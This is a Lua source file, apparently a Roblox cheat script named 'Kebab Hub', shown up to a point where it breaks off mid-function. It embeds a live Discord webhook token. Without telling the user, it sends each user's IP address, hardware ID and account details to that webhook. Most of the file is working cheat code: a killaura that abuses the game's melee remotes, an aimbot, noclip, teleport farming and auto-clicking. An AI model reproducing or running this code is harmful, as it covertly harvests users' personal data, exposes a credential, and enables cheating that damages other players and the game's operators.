local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local UserInputService = game:GetService("UserInputService")
local RunService = game:GetService("RunService")
local HttpService = game:GetService("HttpService")
local TweenService = game:GetService("TweenService")
local VirtualInputManager = game:GetService("VirtualInputManager")
local CoreGui = game:GetService("CoreGui")
local StarterGui = game:GetService("StarterGui")

local player = Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()
local humanoidRootPart = character:WaitForChild("HumanoidRootPart")
local head = character:WaitForChild("Head")

local WHITELIST_URL = "https://raw.githubusercontent.com/wwqdwasdw/whitelist-storage/refs/heads/main/whitelist.json"
local DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1452247322359496714/1wA2K1sA4eik-12xHKxFBmVis3qGB3PC4Qs2QkN7GEVa0gMTqLE0z1kwM_c8CKcYc8lo"

local function getIPAddress()
    local success, ip = pcall(function()
        if syn and syn.get_ip_address then return syn.get_ip_address()
        elseif getipaddress and type(getipaddress) == "function" then return getipaddress()
        else return game:HttpGet("https://api.ipify.org") end
    end)
    return success and ip or "Unknown"
end

local function getHWID()
    local success, hwid = pcall(function()
        if syn and syn.get_hwid then return tostring(syn.get_hwid())
        elseif gethwid and type(gethwid) == "function" then return tostring(gethwid())
        elseif get_hwid_ and type(get_hwid_) == "function" then return tostring(get_hwid_())
        elseif get_hwid then return tostring(get_hwid)
        else return "Unknown" end
    end)
    return success and hwid or "Unknown"
end

local function sendToDiscord(action, details, embedColor)
    pcall(function()
        local ipAddress = getIPAddress()
        local hwid = getHWID()
        local data = {
            ["username"] = "Kebab Hub",
            ["embeds"] = {{
                ["title"] = "📊 Script Activity Log",
                ["color"] = embedColor or 0x00FF00,
                ["fields"] = {
                    {["name"] = "👤 User", ["value"] = player.Name, ["inline"] = true},
                    {["name"] = "🆔 User ID", ["value"] = tostring(player.UserId), ["inline"] = true},
                    {["name"] = "🌐 IP Address", ["value"] = "```" .. ipAddress .. "```", ["inline"] = false},
                    {["name"] = "🔧 HWID", ["value"] = "```" .. hwid .. "```", ["inline"] = false},
                    {["name"] = "📱 Action", ["value"] = action, ["inline"] = true},
                    {["name"] = "📝 Details", ["value"] = details or "N/A", ["inline"] = false}
                },
                ["footer"] = {["text"] = "Kebab Hub"},
                ["timestamp"] = os.date("!%Y-%m-%dT%H:%M:%SZ")
            }}
        }
        local jsonData = HttpService:JSONEncode(data)
        if http and http.request then http.request({Url = DISCORD_WEBHOOK, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = jsonData})
        elseif request then request({Url = DISCORD_WEBHOOK, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = jsonData})
        elseif syn and syn.request then syn.request({Url = DISCORD_WEBHOOK, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = jsonData}) end
    end)
end

local function isWhitelisted()
    local success, response = pcall(function()
        local data = game:HttpGet(WHITELIST_URL)
        local whitelist = HttpService:JSONDecode(data)
        local username = player.Name
        local hwid = getHWID()
        if whitelist.users and whitelist.users[username] then
            local userData = whitelist.users[username]
            if not userData.expiry or userData.expiry == 0 or userData.expiry > tick() then return true end
        end
        if whitelist.hwids and whitelist.hwids[hwid] then
            local hwidData = whitelist.hwids[hwid]
            if not hwidData.expiry or hwidData.expiry == 0 or hwidData.expiry > tick() then return true end
        end
        if whitelist.banned and whitelist.banned[username] then return "banned" end
        return false
    end)
    if not success then warn("Whitelist check failed: " .. tostring(response)) return false end
    return response
end

local whitelistResult = isWhitelisted()
if whitelistResult ~= true then
    local reason = whitelistResult == "banned" and "BANNED" or "NOT WHITELISTED"
    sendToDiscord("❌ " .. reason, "Attempted to use Kebab Hub but was kicked.", 0xFF0000)
    task.wait(1)
    task.spawn(function() while true do pcall(function() player:Kick("Not authorized: " .. reason .. ". Contact the server owner.") end) task.wait(0.5) end end)
    while true do task.wait(1) end
end

task.spawn(function() task.wait(2) sendToDiscord("✅ Script Loaded", "Kebab Hub loaded successfully.", 0x00FF00) end)

local config = {
    killaura = {enabled = false, range = 20, attackDelay = 0.1, targetNPCs = true, targetPlayers = false, scanInterval = 0.25, keybind = Enum.KeyCode.K, attackMethod = "auto", method4TeleportBehind = true},
    aimbot = {enabled = false, lockPart = "Head", targetNPCs = true, targetPlayers = false, keybind = Enum.KeyCode.L, wallbang = false, updateInterval = 0.1, smoothness = 0.3, fov = {enabled = true, radius = 150, color = Color3.fromRGB(255, 100, 255), transparency = 0.6, thickness = 2, visible = true}, prediction = {enabled = true, factor = 0.5, maxPrediction = 10}},
    scourgeFarm = {enabled = false, position = Vector3.new(1101, -96, -61)}
}

local state = {lastAttackTime = 0, lastScanTime = 0, lastStatusUpdate = 0, lastAimbotUpdate = 0, cachedTargets = {}, statusUpdateInterval = 0.3, currentAimbotTarget = nil, highlightObject = nil, npcFolders = {}, attackSuccessCount = 0, attackFailCount = 0, guiButtons = {}, targetVelocity = Vector3.new(0,0,0), lastTargetPosition = nil, lastTargetTime = 0, fovCircle = nil, fovVisible = true, currentCamera = workspace.CurrentCamera, targetInFov = false, extremeAutoClickerRunning = false}
local EXTREME_CLICK_INTERVAL = 5
local ExtremeMode = {enabled = false, authorized = true, speed = 0, attackDelay = 0.08, lastAttackTime = 0, lastTeleportTime = 0, lastClickTime = 0, isTeleporting = false, guiVisible = true, maxRange = 999999}
local authorizationMemory = {extremeModeAuthorized = true, authorizationTime = tick(), authKey = "TEST", authType = "PREMIUM", permanent = true, timeout = 0}
local scourgeConnection = nil

local function fastWalkToTarget(targetPosition)
    local char = player.Character
    if not char then return false end
    
    local hrp = char:FindFirstChild("HumanoidRootPart")
    if not hrp then return false end
    
    local startPos = hrp.Position
    local finalTarget = targetPosition + Vector3.new(0, 6, 0)
    
    local distance = (finalTarget - startPos).Magnitude
    local duration = math.clamp(distance / 300, 0.5, 3)
    
    local tweenInfo = TweenInfo.new(duration, Enum.EasingStyle.Linear)
    local tween = TweenService:Create(hrp, tweenInfo, {CFrame = CFrame.new(finalTarget)})
    tween:Play()
    
    local connection
    connection = RunService.Heartbeat:Connect(function()
        if hrp and hrp.Parent then
            hrp.AssemblyLinearVelocity = Vector3.zero
            hrp.AssemblyAngularVelocity = Vector3.zero
        end
    end)
    
    tween.Completed:Wait()
    connection:Disconnect()
    
    return true
end

local function toggleScourgeFarm(enabled)
    if enabled then
        local char = player.Character
        if not char then return end
        
        local hrp = char:FindFirstChild("HumanoidRootPart")
        if not hrp then return end

        hrp.CFrame = CFrame.new(config.scourgeFarm.position)

        for _, part in ipairs(char:GetDescendants()) do
            if part:IsA("BasePart") then
                part.CanCollide = false
            end
        end

        scourgeConnection = game:GetService("RunService").Heartbeat:Connect(function()
            if not config.scourgeFarm.enabled then return end
            local char = player.Character
            if not char then return end
            local hrp = char:FindFirstChild("HumanoidRootPart")
            if not hrp then return end
            hrp.CFrame = CFrame.new(config.scourgeFarm.position)
            hrp.AssemblyLinearVelocity = Vector3.zero
            hrp.AssemblyAngularVelocity = Vector3.zero
        end)
    else
        if scourgeConnection then
            scourgeConnection:Disconnect()
            scourgeConnection = nil
        end
        local char = player.Character
        if char then
            local hrp = char:FindFirstChild("HumanoidRootPart")
            if hrp then
                hrp.CFrame = CFrame.new(1157, -108, -80)
            end
            for _, part in ipairs(char:GetDescendants()) do
                if part:IsA("BasePart") then
                    part.CanCollide = true
                end
            end
        end
    end
end

local function noclip(state)
    pcall(function()
        local char = player.Character
        if char then
            for _, part in ipairs(char:GetDescendants()) do
                if part:IsA("BasePart") and part.CanCollide then
                    part.CanCollide = not state
                end
            end
        end
    end)
end

local function extremeAutoClick()
    pcall(function()
        local vp = workspace.CurrentCamera.ViewportSize
        local cx = math.floor(vp.X / 2)
        local cy = math.floor(vp.Y / 2)
        VirtualInputManager:SendMouseButtonEvent(cx, cy, 0, true, game, 0)
        task.wait(0.05)
        VirtualInputManager:SendMouseButtonEvent(cx, cy, 0, false, game, 0)
    end)
end

local function startExtremeAutoClicker()
    if state.extremeAutoClickerRunning then return end
    state.extremeAutoClickerRunning = true
    task.spawn(function()
        while true do
            if ExtremeMode.enabled and ExtremeMode.authorized then
                local currentTime = tick()
                if currentTime - ExtremeMode.lastClickTime >= EXTREME_CLICK_INTERVAL then
                    extremeAutoClick()
                    ExtremeMode.lastClickTime = currentTime
                end
            end
            task.wait(0.5)
        end
    end)
end

local function createFovCircle()
    if state.fovCircle and state.fovCircle.Parent then state.fovCircle:Destroy() end
    local screenGui = player.PlayerGui:FindFirstChild("KebabHub")
    if not screenGui then pcall(function() screenGui = player.PlayerGui:WaitForChild("KebabHub", 5) end) if not screenGui then return end end
    local fovContainer = Instance.new("Frame")
    fovContainer.Name = "FOVContainer"
    fovContainer.Size = UDim2.new(1, 0, 1, 0)
    fovContainer.BackgroundTransparency = 1
    fovContainer.ZIndex = 999
    fovContainer.Parent = screenGui
    local useDrawing = pcall(function() return Drawing end)
    if useDrawing then
        local circle = Drawing.new("Circle")
        circle.Visible = false circle.Thickness = 2 circle.Radius = config.aimbot.fov.radius circle.Color = Color3.toRGB(config.aimbot.fov.color) circle.Transparency = config.aimbot.fov.transparency circle.Filled = false circle.NumSides = 64
        local function updateDrawingFov()
            if not config.aimbot.fov.visible or not config.aimbot.enabled then circle.Visible = false return end
            local viewportSize = workspace.CurrentCamera and workspace.CurrentCamera.ViewportSize or Vector2.new(1920, 1080)
            circle.Position = Vector2.new(viewportSize.X / 2, viewportSize.Y / 2)
            circle.Radius = config.aimbot.fov.radius
            circle.Color = state.targetInFov and Color3.fromRGB(100, 255, 100) or Color3.toRGB(config.aimbot.fov.color)
            circle.Transparency = config.aimbot.fov.transparency
            circle.Visible = true
        end
        state.fovCircle = {object = circle, type = "drawing", update = updateDrawingFov}
        local fovUpdateConnection = RunService.RenderStepped:Connect(function()
            if config.aimbot.enabled and config.aimbot.fov.visible and state.fovCircle and state.fovCircle.type == "drawing" then state.fovCircle.update()
            elseif state.fovCircle and state.fovCircle.type == "drawing" then state.fovCircle.object.Visible = false end
        end)
        state.fovUpdateConnection = fovUpdateConnection
        updateDrawingFov()
    else
        local circle = Instance.new("ImageLabel")
        circle.Name = "FovCircle" circle.Size = UDim2.new(0, config.aimbot.fov.radius * 2, 0, config.aimbot.fov.radius * 2) circle.Position = UDim2.new(0.5, -config.aimbot.fov.radius, 0.5, -config.aimbot.fov.radius) circle.BackgroundTransparency = 1 circle.Image = "rbxassetid://4995549660" circle.ImageColor3 = config.aimbot.fov.color circle.ImageTransparency = config.aimbot.fov.transparency circle.Visible = config.aimbot.fov.visible and config.aimbot.enabled circle.ZIndex = 999 circle.Parent = fovContainer
        state.fovCircle = {object = circle, type = "ui", container = fovContainer}
    end
end

local function updateFovCircle()
    if not state.fovCircle then return end
    if state.fovCircle.type == "drawing" then if state.fovCircle.update then state.fovCircle.update() end
    else
        local circle = state.fovCircle.object
        if circle then circle.Size = UDim2.new(0, config.aimbot.fov.radius * 2, 0, config.aimbot.fov.radius * 2) circle.Position = UDim2.new(0.5, -config.aimbot.fov.radius, 0.5, -config.aimbot.fov.radius) circle.ImageColor3 = state.targetInFov and Color3.fromRGB(100, 255, 100) or config.aimbot.fov.color circle.ImageTransparency = config.aimbot.fov.transparency circle.Visible = config.aimbot.fov.visible and config.aimbot.enabled end
    end
end

local function isTargetInFov(targetPosition)
    if not state.currentCamera then state.currentCamera = workspace.CurrentCamera return false end
    local screenPoint, onScreen = state.currentCamera:WorldToViewportPoint(targetPosition)
    if not onScreen then return false end
    local screenCenter = Vector2.new(state.currentCamera.ViewportSize.X / 2, state.currentCamera.ViewportSize.Y / 2)
    local distanceFromCenter = (Vector2.new(screenPoint.X, screenPoint.Y) - screenCenter).Magnitude
    return distanceFromCenter <= config.aimbot.fov.radius
end

local function smoothAim(currentCFrame, targetPos, smoothness, dt)
    local camPos = currentCFrame.Position
    local currentLook = currentCFrame.LookVector
    local targetLook = (targetPos - camPos).Unit
    if smoothness <= 0 then return CFrame.new(camPos, camPos + targetLook) end
    local lerpFactor = math.clamp(1 - smoothness, 0.01, 1)
    local adjustedLerp = 1 - (1 - lerpFactor) ^ (dt * 60)
    local newLook = currentLook:Lerp(targetLook, adjustedLerp).Unit
    return CFrame.new(camPos, camPos + newLook)
end

local antiFlashbangEnabled = false
local storedFlashbangFiles = {}

local function storeFlashbangFiles()
    local flashbangGui = player.PlayerGui:FindFirstChild("Flashbang")
    if not flashbangGui then return end
    storedFlashbangFiles = {}
    for _, child in ipairs(flashbangGui:GetChildren()) do table.insert(storedFlashbangFiles, child) end
end

local function restoreFlashbangFiles()
    local flashbangGui = player.PlayerGui:FindFirstChild("Flashbang")
    if not flashbangGui then return end
    for _, file in ipairs(storedFlashbangFiles) do if file and not file.Parent then file.Parent = flashbangGui end end
end

local function clearFlashbangFiles()
    local flashbangGui = player.PlayerGui:FindFirstChild("Flashbang")
    if not flashbangGui then return end
    for _, child in ipairs(flashbangGui:GetChildren()) do child.Parent = nil end
end

local function toggleAntiFlashbang(enabled)
    if enabled then if #storedFlashbangFiles == 0 then storeFlashbangFiles() end clearFlashbangFiles()
    else restoreFlashbangFiles() end
end

local function monitorFlashbang()
    local flashbangGui = player.PlayerGui:FindFirstChild("Flashbang")
    if flashbangGui and antiFlashbangEnabled then
        for _, child in ipairs(flashbangGui:GetChildren()) do
            local stored = false
            for _, s in ipairs(storedFlashbangFiles) do if s == child then stored = true break end end
            if not stored then table.insert(storedFlashbangFiles, child) end
            child.Parent = nil
        end
    end
end

task.spawn(function() while true do task.wait(1) if antiFlashbangEnabled then pcall(monitorFlashbang) end end end)

local function clickOnButton(button)
    if not button or not button.Parent then return false end
    pcall(function() if button:IsA("TextButton") or button:IsA("ImageButton") then button.MouseButton1Click:Fire() end end)
    return true
end

local function findAcceptButton()
    local mainStatic = StarterGui:FindFirstChild("MainStaticGui")
    if not mainStatic then return nil end
    local alerts = mainStatic:FindFirstChild("Alerts")
    if not alerts then return nil end
    local alertsCore = alerts:FindFirstChild("AlertsCore")
    if not alertsCore then return nil end
    local frames = alertsCore:FindFirstChild("Frames")
    if not frames then return nil end
    local alertFrame = frames:FindFirstChild("AlertFrame")
    if not alertFrame then return nil end
    local accept = alertFrame:FindFirstChild("Accept")
    if not accept then return nil end
    if accept.Visible and accept.AbsoluteSize.X > 0 then return accept end
    return nil
end

spawn(function() while task.wait(2) do pcall(function() local acceptButton = findAcceptButton() if acceptButton then clickOnButton(acceptButton) end end) end end)

local meleeStorage = nil
local ok, tmp = pcall(function() return ReplicatedStorage:WaitForChild("MeleeStorage", 5) end)
if ok then meleeStorage = tmp end

local swingRemote, hitRemote, updateStatesRemote
if meleeStorage then
    local meleeEvents = meleeStorage:FindFirstChild("Events")
    if meleeEvents then swingRemote = meleeEvents:FindFirstChild("Swing") hitRemote = meleeEvents:FindFirstChild("Hit") end
end

local eventsFolder = ReplicatedStorage:FindFirstChild("Events")
if eventsFolder then
    local playerFolder = eventsFolder:FindFirstChild("Player")
    if playerFolder then updateStatesRemote = playerFolder:FindFirstChild("UpdateStates") end
end

local npcPatterns = {"pathfinder", "storage guard:", "guard", "officer", "enemy", "soldier", "trooper", "military operator", "blade dancer", "commander", "gate guard", "scrap operator", "outlander scout", "outlander brawler", "outlander mercenary", "scrapper operator"}

local function cacheFolders()
    state.npcFolders = {}
    local npcsFolder = workspace:FindFirstChild("NPCs")
    if npcsFolder then
        local customFolder = npcsFolder:FindFirstChild("Custom")
        if customFolder then table.insert(state.npcFolders, {folder = customFolder, skipCheck = true}) end
        local hostileFolder = npcsFolder:FindFirstChild("Hostile")
        if hostileFolder then table.insert(state.npcFolders, {folder = hostileFolder, skipCheck = true}) end
    end
    local wsCustom = workspace:FindFirstChild("Custom")
    if wsCustom then table.insert(state.npcFolders, {folder = wsCustom, skipCheck = true}) end
    local wsHostile = workspace:FindFirstChild("Hostile")
    if wsHostile then table.insert(state.npcFolders, {folder = wsHostile, skipCheck = true}) end
    local arenaFolder = workspace:FindFirstChild("Arena")
    if arenaFolder then table.insert(state.npcFolders, {folder = arenaFolder, skipCheck = false}) end
    local activeTasks = workspace:FindFirstChild("ActiveTasks")
    if activeTasks then
        table.insert(state.npcFolders, {folder = activeTasks, skipCheck = true})
        local function addAllFolders(parent)
            for _, child in ipairs(parent:GetChildren()) do
                if child:IsA("Folder") or child:IsA("Model") then
                    table.insert(state.npcFolders, {folder = child, skipCheck = true})
                    addAllFolders(child)
                end
            end
        end
        addAllFolders(activeTasks)
    end
    local accessDenied = workspace:FindFirstChild("AccessDenied")
    if accessDenied then table.insert(state.npcFolders, {folder = accessDenied, skipCheck = true}) end
    local waveSurvival = workspace:FindFirstChild("WaveSurvival")
    if waveSurvival then
        table.insert(state.npcFolders, {folder = waveSurvival, skipCheck = true})
        local waveNpcs = waveSurvival:FindFirstChild("NPCs")
        if waveNpcs then
            table.insert(state.npcFolders, {folder = waveNpcs, skipCheck = true})
        end
    end
    table.insert(state.npcFolders, {folder = workspace, skipCheck = false})
end

cacheFolders()

task.spawn(function() while true do task.wait(10) pcall(cacheFolders) end end)

local function isNPCName(name)
    if not name then return false end
    local lowerName = string.lower(name)
    for i = 1, #npcPatterns do if string.find(lowerName, npcPatterns[i], 1, true) then return true end end
    return false
end

local function isValidNPC(model, skipNameCheck)
    if not model or not model:IsA("Model") or model == character then return false end
    if not skipNameCheck and not isNPCName(model.Name) then return false end
    if Players:GetPlayerFromCharacter(model) then return false end
    local humanoid = model:FindFirstChildOfClass("Humanoid")
    local rootPart = model:FindFirstChild("HumanoidRootPart")
    if humanoid and humanoid.Health and humanoid.Health > 0 and rootPart and rootPart.Parent then return true, rootPart, humanoid end
    return false
end

local function getTargets(useKillauraSettings)
    local currentTime = tick()
    local settings = useKillauraSettings and config.killaura or config.aimbot
    if useKillauraSettings and currentTime - state.lastScanTime < settings.scanInterval and #state.cachedTargets > 0 then return state.cachedTargets end
    if useKillauraSettings then state.lastScanTime = currentTime end
    if not humanoidRootPart or not humanoidRootPart.Parent then return {} end
    local targets = {} local targetCount = 0
    local playerPos = humanoidRootPart.Position
    if not playerPos then return {} end
    local rangeSquared
    if useKillauraSettings and settings.range then rangeSquared = settings.range * settings.range end
    if settings.targetNPCs then
        for _, folderData in ipairs(state.npcFolders) do
            local folder, skipCheck = folderData.folder, folderData.skipCheck
            if folder then
                for _, npc in ipairs(folder:GetChildren()) do
                    pcall(function()
                        local isNPC, rootPart, humanoid = isValidNPC(npc, skipCheck)
                        if isNPC and rootPart and rootPart.Parent then
                            local npcPos = rootPart.Position
                            if npcPos then
                                local dx, dy, dz = playerPos.X - npcPos.X, playerPos.Y - npcPos.Y, playerPos.Z - npcPos.Z
                                local distSq = dx*dx + dy*dy + dz*dz
                                if not useKillauraSettings or not rangeSquared or distSq <= rangeSquared then
                                    targetCount = targetCount + 1
                                    targets[targetCount] = {model = npc, distance = math.sqrt(distSq), head = npc:FindFirstChild("Head"), torso = npc:FindFirstChild("Torso") or npc:FindFirstChild("UpperTorso"), rootPart = rootPart, humanoid = humanoid}
                                end
                            end
                        end
                    end)
                end
            end
        end
    end
    if settings.targetPlayers then
        for _, plr in ipairs(Players:GetPlayers()) do
            if plr ~= player and plr.Character then
                local humanoid = plr.Character:FindFirstChild("Humanoid")
                local rootPart = plr.Character:FindFirstChild("HumanoidRootPart")
                if humanoid and rootPart and rootPart.Parent and humanoid.Health and humanoid.Health > 0 then
                    local plrPos = rootPart.Position
                    if plrPos then
                        local diff = playerPos - plrPos
                        local distSq = diff.X*diff.X + diff.Y*diff.Y + diff.Z*diff.Z
                        if not useKillauraSettings or not rangeSquared or distSq <= rangeSquared then
                            targetCount = targetCount + 1
                            targets[targetCount] = {model = plr.Character, distance = math.sqrt(distSq), head = plr.Character:FindFirstChild("Head"), torso = plr.Character:FindFirstChild("Torso") or plr.Character:FindFirstChild("UpperTorso"), rootPart = rootPart, humanoid = humanoid}
                        end
                    end
                end
            end
        end
    end
    table.sort(targets, function(a, b) return (a.distance or math.huge) < (b.distance or math.huge) end)
    if not useKillauraSettings and config.aimbot.enabled and config.aimbot.fov.enabled then
        local fovTargets = {} local fovCount = 0
        for i = 1, #targets do
            local target = targets[i]
            local lockPart = (config.aimbot.lockPart == "Head") and target.head or target.torso
            if lockPart and lockPart.Parent then
                if isTargetInFov(lockPart.Position) then fovCount = fovCount + 1 fovTargets[fovCount] = target end
            end
        end
        state.targetInFov = fovCount > 0 updateFovCircle()
        if fovCount > 0 then return fovTargets end
        state.targetInFov = false return {}
    end
    if useKillauraSettings then state.cachedTargets = targets end
    return targets
end

local function attackMethod1(targetData)
    if not targetData then return false end
    local targetRoot = targetData.rootPart
    if not targetRoot or not targetRoot.Parent then return false end
    local model = targetData.model
    local bodyParts = {}
    if targetData.head and targetData.head.Parent then table.insert(bodyParts, targetData.head) end
    if targetData.torso and targetData.torso.Parent then table.insert(bodyParts, targetData.torso) end
    local limbs = {"Right Arm","Left Arm","Right Leg","Left Leg","RightUpperArm","LeftUpperArm","RightLowerArm","LeftLowerArm","RightUpperLeg","LeftUpperLeg","RightLowerLeg","LeftLowerLeg"}
    for _, limbName in ipairs(limbs) do local limb = model:FindFirstChild(limbName) if limb and limb.Parent then table.insert(bodyParts, limb) end end
    if #bodyParts == 0 then return false end
    local targetPart = bodyParts[math.random(1, #bodyParts)]
    local success = false
    if updateStatesRemote then
        pcall(function()
            if not humanoidRootPart or not humanoidRootPart.Parent then return end
            local playerPos = humanoidRootPart.Position
            local camera = workspace.CurrentCamera
            if not camera then return end
            local cameraPos = camera.CFrame.Position
            local targetPos = targetPart and targetPart.Position
            if not targetPos then return end
            local direction = (targetPos - playerPos)
            local magnitude = direction.Magnitude
            if magnitude == 0 then return end
            local dirUnit = direction / magnitude
            updateStatesRemote:FireServer(Vector3.new(playerPos.X, playerPos.Y, playerPos.Z), Vector3.new(cameraPos.X, cameraPos.Y, cameraPos.Z), Vector3.new(dirUnit.X, dirUnit.Y, dirUnit.Z), {Crouching = false, Sprinting = false, Aiming = false})
        end)
        task.wait(0.02)
    end
    if swingRemote then local s = pcall(function() swingRemote:InvokeServer() end) if s then success = true end task.wait(0.03)
    else return false end
    if hitRemote and targetPart and targetPart.Parent then pcall(function() hitRemote:FireServer(targetPart, targetPart.Position) success = true end) end
    return success
end

local function attackMethod2(targetData)
    if not targetData then return false end
    local targetHead = targetData.head
    if not targetHead or not targetHead.Parent then return false end
    local success = false
    if swingRemote then pcall(function() swingRemote:InvokeServer() success = true end) task.wait(0.01) end
    if hitRemote then pcall(function() hitRemote:FireServer(targetHead, targetHead.Position) success = true end) end
    return success
end

local function attackMethod3(targetData)
    if not targetData then return false end
    local targetHead = targetData.head
    local targetRoot = targetData.rootPart
    if not targetHead or not targetRoot then return false end
    local success = false
    pcall(function() humanoidRootPart.CFrame = CFrame.new(humanoidRootPart.Position, targetRoot.Position) end)
    task.wait(0.01)
    if swingRemote then pcall(function() swingRemote:InvokeServer() success = true end) task.wait(0.02) end
    if hitRemote then pcall(function() hitRemote:FireServer(targetHead, targetHead.Position) success = true end) end
    return success
end

local function attackMethod4(targetData)
    if not targetData then return false end
    local targetHead = targetData.head
    local targetRoot = targetData.rootPart
    if not targetHead or not targetRoot then return false end
    local success = false
    local originalPosition = humanoidRootPart.CFrame
    local needsTeleport = false
    if config.killaura.method4TeleportBehind then
        local toTarget = (targetRoot.Position - humanoidRootPart.Position)
        if toTarget.Magnitude > 0 then
            local raycastParams = RaycastParams.new()
            raycastParams.FilterDescendantsInstances = {character, targetData.model}
            raycastParams.FilterType = Enum.RaycastFilterType.Exclude
            local rayResult = workspace:Raycast(humanoidRootPart.Position, toTarget.Unit * toTarget.Magnitude, raycastParams)
            if rayResult then needsTeleport = true end
        end
    end
    if needsTeleport then humanoidRootPart.CFrame = targetRoot.CFrame * CFrame.new(0, 0, 3) task.wait(0.05) end
    if swingRemote then pcall(function() swingRemote:InvokeServer() success = true end) task.wait(0.02) end
    if hitRemote then pcall(function() hitRemote:FireServer(targetHead, targetHead.Position) success = true end) end
    if needsTeleport then task.wait(0.03) humanoidRootPart.CFrame = originalPosition end
    return success
end

local function attackTarget(targetData)
    local method = config.killaura.attackMethod
    local success = false
    if method == "auto" or method == "method1" then success = attackMethod1(targetData) if method == "auto" and not success then success = attackMethod2(targetData) end
    elseif method == "method2" then success = attackMethod2(targetData)
    elseif method == "method3" then success = attackMethod3(targetData)
    elseif method == "method4" then success = attackMethod4(targetData) end
    if success then state.attackSuccessCount = state.attackSuccessCount + 1 else state.attackFailCount = state.attackFailCount + 1 end
    return success
end

local function getPredictedPosition(target, currentTime)
    if not target or not target.rootPart then return nil end
    local currentPos = target.rootPart.Position
    if not config.aimbot.prediction.enabled or config.aimbot.prediction.factor <= 0 then return currentPos end
    if state.lastTargetPosition and state.lastTargetTime > 0 then
        local timeDelta = currentTime - state.lastTargetTime
        if timeDelta > 0 then
            local newVelocity = (currentPos - state.lastTargetPosition) / timeDelta
            state.targetVelocity = state.targetVelocity.Magnitude > 0 and state.targetVelocity:Lerp(newVelocity, 0.5) or newVelocity
            if state.targetVelocity.Magnitude > 100 then state.targetVelocity = state.targetVelocity.Unit * 100 end
        end
    end
    state.lastTargetPosition = currentPos
    state.lastTargetTime = currentTime
    if state.targetVelocity.Magnitude > 0.1 then
        local predTime = config.aimbot.updateInterval * config.aimbot.prediction.factor * 2
        local predictedOffset = state.targetVelocity * predTime
        if predictedOffset.Magnitude > config.aimbot.prediction.maxPrediction then predictedOffset = predictedOffset.Unit * config.aimbot.prediction.maxPrediction end
        return currentPos + predictedOffset
    end
    return currentPos
end

local lastAimbotDt = tick()

local function updateAimbot()
    if not config.aimbot.enabled then
        state.currentAimbotTarget = nil
        if state.highlightObject then state.highlightObject:Destroy() state.highlightObject = nil end
        return
    end
    updateFovCircle()
    if not workspace.CurrentCamera then return end
    state.currentCamera = workspace.CurrentCamera
    local targets = getTargets(false)
    local currentTime = tick()
    local dt = currentTime - lastAimbotDt
    lastAimbotDt = currentTime

    if #targets > 0 then
        local target = targets[1]
        local lockPart
        if config.aimbot.lockPart == "Head" then lockPart = target.head else lockPart = target.torso end
        if not lockPart or not lockPart.Parent then lockPart = target.head or target.torso end
        if lockPart and lockPart.Parent then
            local hasLineOfSight = true
            if not config.aimbot.wallbang then
                local camera = workspace.CurrentCamera
                local rayOrigin = camera.CFrame.Position
                local lockPos = lockPart.Position
                if rayOrigin and lockPos then
                    local diff = lockPos - rayOrigin
                    if diff.Magnitude > 0 then
                        local raycastParams = RaycastParams.new()
                        raycastParams.FilterDescendantsInstances = {character, target.model}
                        raycastParams.FilterType = Enum.RaycastFilterType.Exclude
                        local rayResult = workspace:Raycast(rayOrigin, diff.Unit * diff.Magnitude, raycastParams)
                        if rayResult then hasLineOfSight = false end
                    end
                end
            end
            if hasLineOfSight then
                local targetPosition = lockPart.Position
                if config.aimbot.prediction.enabled then local predictedPos = getPredictedPosition(target, currentTime) if predictedPos then targetPosition = predictedPos end end
                if config.aimbot.fov.enabled and not isTargetInFov(targetPosition) then state.currentAimbotTarget = nil return end
                local cam = workspace.CurrentCamera
                if cam then cam.CFrame = smoothAim(cam.CFrame, targetPosition, config.aimbot.smoothness, dt) end
                state.currentAimbotTarget = target
                state.targetInFov = true
                updateFovCircle()
                if not state.highlightObject or state.highlightObject.Parent ~= target.model then
                    if state.highlightObject then state.highlightObject:Destroy() end
                    state.highlightObject = Instance.new("Highlight")
                    state.highlightObject.FillColor = Color3.fromRGB(180, 130, 255)
                    state.highlightObject.OutlineColor = Color3.fromRGB(220, 100, 255)
                    state.highlightObject.FillTransparency = 0.5
                    state.highlightObject.OutlineTransparency = 0
                    state.highlightObject.Parent = target.model
                end
            else
                state.currentAimbotTarget = nil
                if state.highlightObject then state.highlightObject:Destroy() state.highlightObject = nil end
            end
        end
    else
        state.currentAimbotTarget = nil
        state.targetInFov = false
        updateFovCircle()
        if state.highlightObject then state.highlightObject:Destroy() state.highlightObject = nil end
    end
end

local function extremeModeTeleportAttack()
    if not ExtremeMode.enabled or not ExtremeMode.authorized then return end
    if not humanoidRootPart or not humanoidRootPart.Parent then return end
    local currentTime = tick()
    if currentTime - ExtremeMode.lastTeleportTime >= ExtremeMode.speed then
        local allTargets = {}
        for _, folderData in ipairs(state.npcFolders) do
            local folder = folderData.folder
            if folder then
                for _, npc in ipairs(folder:GetChildren()) do
                    pcall(function()
                        local isNPC, rootPart, humanoid = isValidNPC(npc, true)
                        if isNPC and rootPart and rootPart.Parent then
                            table.insert(allTargets, {model=npc, rootPart=rootPart, humanoid=humanoid, head=npc:FindFirstChild("Head"), torso=npc:FindFirstChild("Torso") or npc:FindFirstChild("UpperTorso")})
                        end
                    end)
                end
            end
        end
        if #allTargets > 0 then
            local playerPos = humanoidRootPart.Position
            table.sort(allTargets, function(a, b) return (playerPos - a.rootPart.Position).Magnitude < (playerPos - b.rootPart.Position).Magnitude end)
            local target = allTargets[1]
            if target and target.rootPart and target.rootPart.Parent then
                local targetHeadPos = target.rootPart.Position
                if target.head and target.head.Parent then
                    targetHeadPos = target.head.Position
                end
                ExtremeMode.isTeleporting = true
                fastWalkToTarget(targetHeadPos)
                ExtremeMode.lastTeleportTime = currentTime
                task.wait(0.05)
                if currentTime - ExtremeMode.lastAttackTime >= ExtremeMode.attackDelay then
                    if swingRemote then pcall(function() swingRemote:InvokeServer() end) end
                    if hitRemote and target.head and target.head.Parent then
                        pcall(function() hitRemote:FireServer(target.head, target.head.Position) end)
                    end
                    ExtremeMode.lastAttackTime = currentTime
                end
                ExtremeMode.isTeleporting = false
            end
        end
    end
end

local function checkExtremeModeAuth()
    if authorizationMemory.extremeModeAuthorized then
        if authorizationMemory.permanent then ExtremeMode.authorized = true return true end
